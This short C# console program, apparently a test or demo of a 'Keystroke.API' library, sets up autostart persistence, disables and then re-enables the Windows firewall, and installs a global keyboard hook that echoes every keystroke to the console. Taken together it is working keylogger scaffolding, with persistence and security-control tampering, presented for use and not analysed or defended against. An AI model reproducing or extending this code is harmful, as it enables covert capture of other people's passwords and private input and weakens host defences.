using Keystroke.API;
using System;
using System.Windows.Forms;

namespace ConsoleApplicationTest
{
    class Program
    {
        static void Main(string[] args)
        {
            var autostart = new Autostart();
            autostart.Install();

            var firewall = new Firewall();
            firewall.Disable();
            firewall.Enable();

            using (var api = new KeystrokeAPI())
            {
                api.CreateKeyboardHook(Console.Write);
                Application.Run();
            }
        }
    }
}
